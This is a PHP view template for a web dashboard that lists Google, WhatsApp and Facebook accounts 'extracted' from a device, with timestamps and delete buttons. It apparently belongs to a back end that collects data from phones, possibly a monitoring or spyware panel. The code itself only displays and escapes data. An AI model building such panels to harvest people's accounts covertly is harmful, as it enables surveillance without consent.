<?php /** @var array $rows @var int $total @var object $pager @var string $nav_urls */ ?>
<div class="content-wrapper">
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-3 align-items-center">
                <div class="col-lg-7">
                    <div class="d-flex align-items-center flex-wrap">
                        <h1 class="h2 mb-0 mr-3"><i class="fas fa-user-circle text-secondary mr-2"></i>Device Accounts</h1>
                        <span class="badge badge-secondary border p-2 text-white"><i class="fas fa-database mr-1"></i>Total: <b><?= $total ?? 0 ?></b></span>
                    </div>
                    <p class="text-muted mt-1 mb-0">Google, WhatsApp and other synced accounts on device</p>
                </div>
                <div class="col-lg-5 text-right"><?= $nav_urls ?></div>


            </div>
        </div>
    </section>
    <section class="content"><div class="container-fluid"><div class="row"><div class="col-12">
        <div class="card card-secondary shadow-sm">
            <div class="card-header">
                <h3 class="card-title"><i class="fas fa-list mr-2"></i>Account List <small class="text-muted ml-2"><?= count($rows) ?> entries</small></h3>
                <div class="card-tools"><button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i></button></div>
            </div>
            <div class="card-body p-0">
                <div class="table-responsive">
                    <table class="table table-hover table-striped mb-0">
                        <thead class="thead-light">
                        <tr>
                            <th>#</th>
                            <th><i class="fas fa-at mr-1"></i>Account Name</th>
                            <th><i class="fas fa-tag mr-1"></i>Account Type</th>
                            <th><i class="fas fa-clock mr-1"></i>Extracted</th>
                            <th class="text-center"><i class="fas fa-cogs mr-1"></i>Actions</th>
                        </tr>
                        </thead>
                        <tbody>
                        <?php if (empty($rows)): ?>
                            <tr><td colspan="5" class="text-center py-5">
                                <div class="empty-state"><i class="fas fa-user-slash fa-3x text-muted mb-3"></i><h4>No accounts found</h4><p class="text-muted">Accounts will appear here once extracted</p></div>
                            </td></tr>
                        <?php else: foreach ($rows as $i => $r): ?>
                            <?php
                                $type = $r['account_type'] ?? '';
                                $icon = str_contains($type, 'google') ? 'fab fa-google text-danger' :
                                       (str_contains($type, 'whatsapp') ? 'fab fa-whatsapp text-success' :
                                       (str_contains($type, 'facebook') ? 'fab fa-facebook text-primary' : 'fas fa-user-tag text-secondary'));
                                $ts = !empty($r['extracted_at']) ? format_timestamp_display((int)$r['extracted_at']) : '—';
                            ?>
                            <tr>
                                <td><span class="text-muted"><?= $i + 1 ?></span></td>
                                <td>
                                    <div class="d-flex align-items-center">
                                        <div class="adv-avatar mr-2"><i class="<?= $icon ?>"></i></div>
                                        <span class="font-weight-bold"><?= htmlspecialchars($r['account_name'] ?? '—') ?></span>
                                    </div>
                                </td>
                                <td><span class="badge badge-secondary"><?= htmlspecialchars($type) ?></span></td>
                                <td><?= $ts ?></td>
                                <td class="text-center">
                                    <button class="btn btn-sm btn-outline-danger delete-row"
                                            data-id="<?= $r['id'] ?? '' ?>"
                                            data-url="<?= base_url('advanced/accounts/delete') ?>"
                                            title="Delete this row">
                                        <i class="fas fa-trash"></i>
                                    </button>
                                </td>
                            </tr>
                        <?php endforeach; endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
            <div class="card-footer"><div class="float-right"><?php if (isset($pager)): ?><?= $pager->links('default', 'bootstrap5_full') ?><?php endif; ?></div></div>
        </div>
    </div></div></div></section>
</div>
<?php include __DIR__ . '/_adv_style.php'; ?>
<?php include __DIR__ . '/_adv_delete_script.php'; ?>
